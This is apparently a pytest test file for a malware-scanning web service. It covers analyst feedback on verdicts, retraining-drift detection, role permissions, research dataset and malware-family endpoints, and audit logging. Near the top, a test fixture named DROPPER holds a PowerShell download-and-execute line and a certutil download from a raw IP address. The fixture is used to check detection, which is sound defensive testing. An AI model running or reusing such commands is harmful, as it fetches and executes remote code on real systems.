"""Milestone 4: analyst feedback loop (continuous learning) and the Researcher workspace."""

import io
from datetime import datetime, timezone
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.modules.model_management import service as feedback_module
from app.modules.model_management.service import MIN_SAMPLES_FOR_DRIFT, FeedbackService

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b"
)
CLEAN = b"hello, this is a plain and boring text file " * 20


def _h(email="analyst@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


def _scan(name, data, email="analyst@local"):
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": (name, io.BytesIO(data), "application/octet-stream")},
        headers=_h(email),
    )
    assert resp.status_code == 201
    return resp.json()


# --- feedback --------------------------------------------------------------------

def test_analyst_can_correct_a_verdict_and_the_latest_label_wins():
    scan = _scan("fb-dropper.bin", DROPPER + b" fb1")
    assert scan["verdict"]["label"] == "malicious"
    sha = scan["sha256"]

    wrong = client.post("/api/v1/feedback", json={"sha256": sha, "label": "benign", "note": "internal tool"}, headers=_h())
    assert wrong.status_code == 201
    body = wrong.json()
    assert body["label"] == "benign" and body["model_verdict"] == "malicious" and body["agrees"] is False
    assert body["filename"] == "fb-dropper.bin" and body["actor"] == "analyst@local"

    right = client.post("/api/v1/feedback", json={"sha256": sha, "label": "malicious"}, headers=_h("soc@local"))
    assert right.json()["agrees"] is True
    listed = [f for f in client.get("/api/v1/feedback", headers=_h()).json() if f["sha256"] == sha]
    assert len(listed) == 1 and listed[0]["label"] == "malicious"  # one record per sample


def test_feedback_validation_and_permissions():
    sha = _scan("fb-clean.txt", CLEAN + b"fb2")["sha256"]
    assert client.post("/api/v1/feedback", json={"sha256": "0" * 64, "label": "benign"}, headers=_h()).status_code == 404
    assert client.post("/api/v1/feedback", json={"sha256": "short", "label": "benign"}, headers=_h()).status_code == 422
    assert client.post("/api/v1/feedback", json={"sha256": sha, "label": "maybe"}, headers=_h()).status_code == 422
    # researchers read the labelled data but do not label verdicts
    assert client.post("/api/v1/feedback", json={"sha256": sha, "label": "benign"}, headers=_h("researcher@local")).status_code == 403
    assert client.get("/api/v1/feedback", headers=_h("researcher@local")).status_code == 200
    assert client.get("/api/v1/feedback/summary", headers=_h("researcher@local")).status_code == 200
    assert client.get("/api/v1/feedback/export.csv", headers=_h("analyst@local")).status_code == 403


def test_feedback_export_is_csv_for_researchers_and_admins():
    for email in ("researcher@local", "admin@local"):
        resp = client.get("/api/v1/feedback/export.csv", headers=_h(email))
        assert resp.status_code == 200 and resp.headers["content-type"].startswith("text/csv")
        assert resp.text.splitlines()[0].startswith("sha256,filename,analyst_label,model_verdict")


def _detection(i, verdict, prob=None, applicable=True):
    return SimpleNamespace(
        sha256=f"{i:064x}", filename=f"f{i}.exe", verdict_label=verdict, score=90 if verdict == "malicious" else 5,
        ml_probability=prob, ml_applicable=applicable, at=datetime.now(timezone.utc),
    )


@pytest.fixture
def fake_detections(monkeypatch):
    holder = {"items": []}
    monkeypatch.setattr(
        feedback_module.threat_monitoring_service, "all_detections", lambda: holder["items"]
    )
    return holder


def test_drift_detection_recommends_retraining_only_with_enough_evidence(fake_detections):
    svc = FeedbackService()
    fake_detections["items"] = [_detection(i, "malicious", 0.99) for i in range(40)]

    for i in range(5):  # too little evidence yet
        svc.submit(f"{i:064x}", "benign", None, "a")
    summary = svc.summary()
    assert summary.total == 5 and summary.retrain_recommended is False
    assert f"5 of {MIN_SAMPLES_FOR_DRIFT}" in summary.retrain_reason

    for i in range(5, 35):  # analysts keep overruling the model
        svc.submit(f"{i:064x}", "benign", None, "a")
    summary = svc.summary()
    assert summary.total == 35 and summary.retrain_recommended is True
    assert summary.fused_verdict.fp == 35 and summary.fused_verdict.precision == 0.0
    assert summary.agreement_rate == 0.0 and "retrain" in summary.retrain_reason


def test_healthy_model_is_not_flagged(fake_detections):
    svc = FeedbackService()
    fake_detections["items"] = [_detection(i, "malicious", 0.99) for i in range(15)] + [
        _detection(100 + i, "benign", 0.01) for i in range(15)
    ]
    for i in range(15):
        svc.submit(f"{i:064x}", "malicious", None, "a")
        svc.submit(f"{100 + i:064x}", "benign", None, "a")
    summary = svc.summary()
    assert summary.total == 30 and summary.retrain_recommended is False
    assert summary.fused_verdict.precision == 1.0 and summary.fused_verdict.recall == 1.0
    assert summary.ml_detector.accuracy == 1.0
    assert summary.confirmed_malicious == 15 and summary.confirmed_benign == 15


def test_ml_accuracy_ignores_files_the_detector_does_not_score(fake_detections):
    # scripts/documents are not PE files: the ML detector abstains, so its ~0% probability must
    # not be counted as a missed detection
    svc = FeedbackService()
    fake_detections["items"] = [
        _detection(1, "malicious", 0.99, applicable=True),
        _detection(2, "malicious", 0.01, applicable=False),
        _detection(3, "malicious", 0.02, applicable=False),
    ]
    for i in (1, 2, 3):
        svc.submit(f"{i:064x}", "malicious", None, "a")
    summary = svc.summary()
    assert summary.fused_verdict.tp == 3  # the fused verdict (rules) caught all three
    assert summary.ml_detector.tp == 1 and summary.ml_detector.fn == 0
    assert summary.ml_detector.recall == 1.0


# --- research workspace -------------------------------------------------------------

def test_research_endpoints_are_for_researchers_analysts_and_admins():
    for path in ("/api/v1/research/datasets", "/api/v1/research/families", "/api/v1/research/families/export.csv"):
        assert client.get(path, headers=_h("soc@local")).status_code == 403
        assert client.get(path).status_code == 401
        for email in ("researcher@local", "analyst@local", "admin@local"):
            assert client.get(path, headers=_h(email)).status_code == 200


def test_datasets_describe_the_training_corpus_and_the_live_corpus():
    scan = _scan("rs-dropper.bin", DROPPER + b" rs1")
    datasets = {d["id"]: d for d in client.get("/api/v1/research/datasets", headers=_h("researcher@local")).json()}
    assert set(datasets) == {"training-dikedataset", "analysed-corpus", "analyst-feedback"}

    training = datasets["training-dikedataset"]
    assert training["license"] == "MIT" and training["exportable"] is False
    assert training["stats"]["training_samples"] > 1000 and training["records"] > 1000
    assert set(training["stats"]["classes"]) >= {"generic", "trojan"}
    assert client.get("/api/v1/research/datasets/training-dikedataset/export.csv", headers=_h("researcher@local")).status_code == 404

    analysed = datasets["analysed-corpus"]
    assert analysed["records"] >= 1 and analysed["exportable"] is True
    export = client.get("/api/v1/research/datasets/analysed-corpus/export.csv", headers=_h("researcher@local"))
    assert export.status_code == 200
    lines = export.text.splitlines()
    assert lines[0].startswith("at,sha256,filename,verdict,score,level,family")
    assert any(scan["sha256"] in line for line in lines[1:])

    labelled = client.get("/api/v1/research/datasets/analyst-feedback/export.csv", headers=_h("researcher@local"))
    assert labelled.status_code == 200
    assert client.get("/api/v1/research/datasets/nope/export.csv", headers=_h("researcher@local")).status_code == 404


def test_family_analysis():
    scan = _scan("fam-dropper.bin", DROPPER + b" fam1")
    family = scan["verdict"]["family"]
    assert family

    r = _h("researcher@local")
    families = client.get("/api/v1/research/families", headers=r).json()
    mine = next(f for f in families if f["family"] == family)
    assert mine["samples"] >= 1 and mine["malicious"] >= 1 and 0 <= mine["avg_score"] <= 100
    assert [f["samples"] for f in families] == sorted((f["samples"] for f in families), reverse=True)

    detail = client.get(f"/api/v1/research/families/{family.lower()}", headers=r)  # case-insensitive
    assert detail.status_code == 200
    body = detail.json()
    assert body["family"] == family
    assert any(s["sha256"] == scan["sha256"] for s in body["recent_samples"])
    assert sum(body["agreement"].values()) == body["samples"]

    assert client.get("/api/v1/research/families/NoSuchFamily", headers=r).status_code == 404
    export = client.get("/api/v1/research/families/export.csv", headers=r)
    assert export.text.splitlines()[0].startswith("family,samples,malicious,suspicious,avg_score")
    assert any(line.startswith(family + ",") for line in export.text.splitlines()[1:])


def test_research_exports_are_audited():
    client.get("/api/v1/research/families/export.csv", headers=_h("researcher@local"))
    events = client.get("/api/v1/admin/audit", params={"action": "research"}, headers=_h("admin@local")).json()
    assert any(e["action"] == "research.export" and e["actor"] == "researcher@local" for e in events)
